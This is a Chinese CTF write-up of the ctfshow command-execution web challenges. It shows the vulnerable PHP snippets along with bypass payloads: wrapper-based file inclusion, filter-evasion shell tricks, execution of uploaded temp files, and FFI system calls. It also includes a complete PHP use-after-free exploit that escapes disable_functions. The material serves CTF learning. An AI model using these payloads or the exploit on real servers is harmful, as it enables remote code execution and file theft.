# ctfshow命令执行
## 命令执行

参考链接：

[CTFSHOW命令执行](http://t.csdnimg.cn/9jvpb)

### web32

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
}else{
    highlight_file(__FILE__);
}
```

参数过滤的多，利用文件包含

include不用括号，分号可以用?>代替，php最后一句代码不需要`分号`。

payload:

```php
include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
include$_GET[1]?>&1=data://text/plain,<?php system('tac flag.php');?>
```

### web37

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    }
        
}else{
    highlight_file(__FILE__);
}
```

有文件包含的函数，用伪协议

```php
include //只生成警告(E_WARNING)，并且脚本会继续
require //require 会生成致命错误(E_COMPILE_ERROR)并停止脚本
include_once
require_once 等
```

payload:

```php
data://text/plain,<?php passthru('cat fl*');?>
```

### web38

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    }
}else{
    highlight_file(__FILE__);
}
```

过滤了`php`字符，使用base64编码就可以了

```php
data://text/plain;base64,PD9waHAgcGFzc3RocnUoJ2NhdCBmbConKTs/Pg==
```

```php
php短标签
当过滤了php时，我们可以将<?php ?> 换成<?= ?>,代表<?php echo..?>
```

```php
data://text/plain,<?= passthru('cat fl*');?>
```

### web39

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    } 
}else{
    highlight_file(__FILE__);
}
```

继续使用data协议

payload：

```php
data://text/plain,<?php passthru('cat fl*');?>
```

前面的php语句已经闭合，所以后面的`.php`会被当作html输出到页面

![image-20231021223406535](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231021223406535.png)

### web40

```php
<?php
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
}else{
    highlight_file(__FILE__);
}
```

```
get_defined_vars()返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量
next()将内部指针指向数组中的下一个元素，并输出。
array_pop()函数删除数组中的最后一个元素并返回其值
array_flip()函数用于反转/交换数组中所有的键名以及它们关联的键值
array_rand()函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组
getchwd() 函数返回当前工作目录。
scandir() 函数返回指定目录中的文件和目录的数组。
dirname() 函数返回路径中的目录部分。
chdir() 函数改变当前的目录。
readfile() 输出一个文件。
current() 返回数组中的当前单元, 默认取第一个值。
pos() current() 的别名。
next() 函数将内部指针指向数组中的下一个元素，并输出。
end() 将内部指针指向数组中的最后一个元素，并输出。
array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。
array_flip() array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。
array_slice() 函数在数组中根据条件取出一段值，并返回。
array_reverse() 函数返回翻转顺序的数组。
chr() 函数从指定的 ASCII 值返回字符。
hex2bin() — 转换十六进制字符串为二进制字符串。
getenv() 获取一个环境变量的值(在7.1之后可以不给予参数)。
localeconv() 函数返回一包含本地数字及货币格式信息的数组。
```

这个题他过滤的是中文括号不是英文的括号，我们可以利用函数进行执行命令

payload：

```
eval(array_rand(array_filp(next(get_defined_vars()))));
//可以用print_r打印出，返回的命令
print_r(array_pop(next(get_defined_vars())));
eval(array_pop(next(get_defined_vars())));
```

### web41

```php
<?php
if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval("echo($c);");
    }
}else{
    highlight_file(__FILE__);
}
?>
```

数字，字母都被过滤了，还过滤了`$ ^ + ~`自增异或取反都不能用，但这题可以用或

[大佬博客](http://t.csdnimg.cn/WGbm5)，直接用大佬的脚本

![image-20231025115525656](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231025115525656.png)

### web42

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
}
```

```
>/dev/null 黑洞,所有内容输入到该文件都会丢失。
```

payload：

```
cat flag.php;ls 让ls的输出丢失，前面命令正常执行
cat flag.php%0a 进行截断,%26,||
```

### web53

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
} 
```

他没有过滤`$`可以进行空格绕过，虽然它过滤了很多命令，我们可以进行转义符绕过

payload：

```
ta\c${IFS}fl\ag.php
ta''c${IFS}fl''ag.php
mv${IFS}fl\ag.php${IFS}a
```

### web55-56

```php
<?php
// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

过滤了大小写字母，我们可以用通配符代替

姿势一：

**利用bin目录**

[bin目录知识点](https://cloud.tencent.com/developer/article/2162724?from=15425)

```
/bin/base64 flag.php 利用base64读取文件
payload：
/???/????64 ????.???
```

姿势二：

[无字母数字webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

[linux下的.使用](http://blog.sina.com.cn/s/blog_af68a2c201016nh2.html)

.点符号可以执行sh命令（不需要权限）

思路：

我们通过POST上传临时文件，然后用`.`执行临时文件的命令，达到rce的目的

这个文件一般在linux里的/tmp/php??????，最后一个字符是大写，其余是随机大小写

POST上传文件

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://8ae02e84-f005-4cd9-94e8-521eed9aebc6.challenge.ctf.show/" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

抓包传参

```
?c=.+/???/????????[@-[]
```

`[@-[]`是所有大写字母，看ascll码表

![image-20231026125300228](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231026125300228.png)

文件内容是sh命令

```sh
#!/bin/sh
tac flag.php
```

![image-20231026124849801](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231026124849801.png)

### web57

```php
<?php
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
}
```

构造数字36就行了，利用了`$(( ))与整数运算`

```
[root@localhost~]# echo $((1+1))
2
[root@localhost ~]# echo $(())
0
[root@localhost ~]# echo ~$(())
~0
[root@localhost ~]# echo $((~$(())))
-1
```

![image-20231105145852296](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231105145852296.png)

我们要构造36，可以先进行造-37

```
-37
$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))
36
$((~$(($(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))))
有点眼花
```

## disable_functions

### web58

```php
</php
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

payload:

```php
读取文件路径
print_r(scandir(dirname('__FILE__')));
var_dump(scandir('./'));
$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");} //glob协议
$a=opendir("./"); while (($file = readdir($a)) !== false){echo $file . "<br>"; };
$a=scandir('./');foreach($a as $value){echo $value." ";}
```

```php
读取文件内容
show_source("flag.php");
highlight_file("flag.php");
echo file_get_contents("flag.php");
var_dump(file("flag.php")); //file将整个文件读入数组
```

### web59-65

这些题flag都在当前目录下，先查看文件路径

`print_r(scandir('./'));`

然后读取文件内容

`highlight_file("flag.php");`

### web66-67

`var_dump(scandir('/'))`

发现flag在根目录，flag.txt

直接包含就行了

```php
//下面是payload
c=include('/flag.txt');
c=require('/flag.txt');
c=require_once('/flag.txt');
c=highlight_file('/flag.txt');
```

### web68-70

`highlight_file()`被禁了

还是先看目录

`$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}`

payload:

```php
include('/flag.txt')等
```

### web71

给了源码

```php
<?php
error_reporting(0); //关闭了所有的错误显示
ini_set('display_errors', 0); //将这个配置项设置为0，表示不在网页上显示报错
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}

?>
你要上天吗？
```

知识点

```
ob_get_contents — 返回输出缓冲区的内容，只是得到输出缓冲区的内容，但不清除它。 
ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲
```

```php
<?php

ob_start();

echo "Hello ";

$out1 = ob_get_contents(); //Hello

echo "World";

$out2 = ob_get_contents(); //Hello World

ob_end_clean();

var_dump($out1, $out2);
?>
```

输出：

```
string(6) "Hello "
string(11) "Hello World"
```

这里将输出缓存区的内容给清除了，我们可以在想执行代码的后面加上`exit()`和`die()`，退出代码，不执行后面的代码

payload：

```php
include('/flag.txt');exit();
include('/flag.txt');die();
```

### web72

一样的源码

open_basedir 是php.ini 中的 一个配置选项。可以用作与 将用户访问文件的活动范围限制在指定的区域

例如：open_basedir=/var/www/html:/tmp/，就不能获取这两个目录以外的文件

[浅谈绕过open_basedir 的几种用法](https://blog.csdn.net/snowlyzz/article/details/126310439?fromshare=blogdetail)

![image-20231109151255796](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231109151255796.png)

用uaf脚本命令执行poc,要url编码

```php
<?php
function ctfshow($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }
    class Helper {
        public $a, $b, $c, $d;
    }
    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }
    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }
    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }
    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }
    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);
        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);
            if($p_type == 1 && $p_flags == 6) { 
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { 
                $text_size = $p_memsz;
            }
        }
        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }
    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);       
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;
            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }
    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }
    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);
            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }
    function trigger_uaf($arg) {
        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }
    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }
    $n_alloc = 10; 
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];
    $helper = new Helper;
    $helper->b = function ($x) { };
    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);
    $closure_obj = str2ptr($abc, 0x20);
    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }
    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }
    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }
    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper->b)($cmd);
    exit();
}
ctfshow("cat /flag0.txt");ob_end_flush();
?>
```

### web73

查看目录

```php
$a=scandir('/');foreach($a as $value){echo $value." ";}exit();
$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');}exit();
//DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口。
```

查看文件

```
include("/flagc.txt");exit();
```

### web74

payload:

```php
$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');}exit();
$a=new DirectoryIterator("/");foreach($a as $key=>$value){echo $key."=>".$value;}exit();
//这里不用glob协议，因为这题无open_basedir限制
//DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口。
```

### web77

扫描目录

```
$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');}exit();
发现有一个flag36x.txt,还有一个readflag文件
```

[ctfshow web入门 命令执行web75-77](http://t.csdnimg.cn/F7M7K)

这里涉及到FFI扩展，参考

[FFI](https://www.php.net/manual/zh/ffi.cdef.php)

[PHP FFI详解 - 一种全新的PHP扩展方式](https://www.laruence.com/2020/03/11/5475.html)

payload:

```php
$ffi = FFI::cdef("int system(const char *command);");//创建一个system对象
$a='/readflag > 1.txt';//没有回显的
$ffi->system($a);//通过$ffi去调用system函数
```

访问1.txt即可

